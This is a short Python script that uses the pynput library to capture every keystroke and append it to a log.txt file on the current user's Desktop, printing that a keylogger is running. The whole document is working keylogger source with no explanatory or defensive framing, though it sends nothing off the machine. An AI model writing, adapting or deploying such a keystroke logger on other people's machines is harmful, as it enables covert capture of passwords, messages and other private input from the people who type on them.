from pynput.keyboard import Listener
import os

# Automatically get current user's Desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "log.txt")

def log_keystroke(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = f'[{key.name}]' if hasattr(key, 'name') else str(key)

        with open(desktop_path, "a") as f:
            f.write(key_str)
    except:
        pass

if __name__ == "__main__":
    print("Keylogger is running. Press Ctrl+C to stop.")
    with Listener(on_press=log_keystroke) as listener:
        listener.join()
